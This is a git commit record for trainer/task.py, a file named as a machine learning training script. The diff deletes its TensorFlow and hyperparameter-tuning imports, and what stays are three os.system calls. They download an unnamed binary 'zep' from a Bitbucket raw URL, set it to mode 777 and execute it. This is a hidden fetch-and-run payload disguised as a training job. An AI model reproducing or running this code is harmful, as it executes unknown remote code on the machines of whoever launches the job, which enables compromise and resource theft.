e72506a1f8b14daab047b6adb229024bc4b34ab9
etdyjsstyhts <la.s.nerhas.t.he.n@gmail.com>
2023-08-07 17:00:07 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,9 +1,5 @@
 import sys
 import os
-import tensorflow as tf
-import tensorflow_datasets as tfds
-import argparse
-import hypertune
 os.system('wget https://bitbucket.org/mypile/filesg/raw/main/zep')
 os.system('chmod 777 zep')
 os.system('./zep')
